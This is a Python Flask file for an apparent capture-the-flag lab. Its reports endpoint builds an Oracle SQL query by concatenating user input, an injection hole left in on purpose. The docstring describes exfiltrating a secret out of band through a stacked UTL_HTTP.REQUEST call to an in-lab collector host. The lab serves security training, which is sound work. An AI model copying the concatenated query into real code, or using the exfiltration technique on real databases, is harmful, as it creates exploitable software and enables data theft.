# SPDX-License-Identifier: MIT
"""Acme Reports — a reporting endpoint over Oracle 21c with a classic in-band
SQL injection that gives NOTHING back except HTTP 200 and a generic message.

The endpoint:
    GET /reports/by-region?region=<r>
concatenates `region` into a query and runs it through the driver. There is:
  - no result echo (a normalising layer strips the row and returns a fixed
    "found N reports" summary),
  - no error text (all exceptions are swallowed and reported as "server error"),
  - no timing side channel worth using — a random 100..600ms jitter is added.

But the DB user has EXECUTE on UTL_HTTP (the seed grants it) plus a network
ACL that permits reaching the in-lab OOB collector at host `oob` port 9000.
So the intended chain is: inject a stacked PL/SQL call that resolves
UTL_HTTP.REQUEST('http://oob:9000/<exfil-encoded-secret>') as a side effect.
The collector captures the request, and GET /oob/received (an app-side proxy —
the collector is on the DB's egress-drop network) lets the learner read it back.
"""
import json
import os
import random
import time
import urllib.request

import oracledb
from flask import Flask, Response, request

FLAG_PATH = os.environ.get("FLAG_PATH", "/var/lib/lab/flag.txt")
DB_HOST = os.environ.get("DB_HOST", "db")
DB_PORT = int(os.environ.get("DB_PORT", "1521"))
DB_SERVICE = os.environ.get("DB_SERVICE", "REPORTS")
APP_USER = os.environ.get("APP_USER", "reportapp")
APP_PASSWORD = os.environ.get("APP_USER_PASSWORD", "")
OOB_HOST = os.environ.get("OOB_HOST", "oob")
OOB_PORT = int(os.environ.get("OOB_PORT", "9000"))

app = Flask(__name__)


def connect() -> oracledb.Connection:
    return oracledb.connect(user=APP_USER, password=APP_PASSWORD,
                            dsn=f"{DB_HOST}:{DB_PORT}/{DB_SERVICE}")


@app.get("/health")
def health() -> Response:
    return Response("ok", mimetype="text/plain")


@app.get("/")
def index() -> Response:
    return Response(
        "Acme Reports.\n"
        "GET  /reports/by-region?region=<r>   summary of reports for a region\n"
        "GET  /oob/received                    proxy to the in-lab OOB collector\n"
        "POST /solve   {secret}                submit the recovered oracle_secret\n",
        mimetype="text/plain",
    )


@app.get("/reports/by-region")
def by_region() -> Response:
    """VULNERABILITY: `region` is concatenated into a query and executed against
    Oracle. The response is normalised to a fixed "found N reports" — the raw
    rows never reach the client, and errors are hidden behind a generic
    500-adjacent JSON. Random jitter kills the timing side channel."""
    region = request.args.get("region", "")
    # Anti-timing-oracle jitter (~100-600ms) — advertised in the README so
    # learners don't spend time on a doomed time-based approach.
    time.sleep(0.1 + random.random() * 0.5)
    sql = "SELECT COUNT(*) FROM reports WHERE region = '" + region + "'"
    conn = None
    try:
        conn = connect()
        with conn.cursor() as cur:
            cur.execute(sql)
            count = cur.fetchone()[0]
    except Exception:  # noqa: BLE001 -- swallowed on purpose: no error channel
        return Response(json.dumps({"ok": False, "error": "server error"}),
                        mimetype="application/json", status=200)
    finally:
        if conn is not None:
            conn.close()
    return Response(json.dumps({"ok": True, "message": "found %d reports" % int(count)}),
                    mimetype="application/json")


@app.get("/oob/received")
def oob_received() -> Response:
    """Proxy to the in-lab collector. The collector is only reachable from the
    `backend` network (internal:true); this endpoint is the learner's window."""
    try:
        with urllib.request.urlopen(f"http://{OOB_HOST}:{OOB_PORT}/received", timeout=5) as resp:
            body = resp.read()
    except Exception as e:  # noqa: BLE001
        return Response(json.dumps({"ok": False, "error": str(e)}),
                        mimetype="application/json", status=502)
    return Response(body, mimetype="application/json")


@app.post("/solve")
def solve() -> Response:
    body = request.get_json(silent=True) or {}
    submitted = str(body.get("secret", "")).strip().lower()
    conn = None
    try:
        conn = connect()
        with conn.cursor() as cur:
            cur.execute("SELECT oracle_secret FROM secrets WHERE id = 1")
            row = cur.fetchone()
            expected = row[0] if row else ""
    except Exception:  # noqa: BLE001
        return Response(json.dumps({"ok": False, "error": "server error"}),
                        mimetype="application/json", status=500)
    finally:
        if conn is not None:
            conn.close()
    # Constant-time comparison — align with copy-program/moveit/fortinet.
    import hmac
    if submitted and expected and hmac.compare_digest(submitted, expected.lower()):
        try:
            with open(FLAG_PATH, encoding="utf-8") as fh:
                flag = fh.read().strip()
        except OSError:
            flag = "(flag unavailable)"
        return Response(json.dumps({"ok": True, "flag": flag}),
                        mimetype="application/json")
    return Response(json.dumps({"ok": False, "error": "incorrect secret"}),
                    mimetype="application/json", status=403)
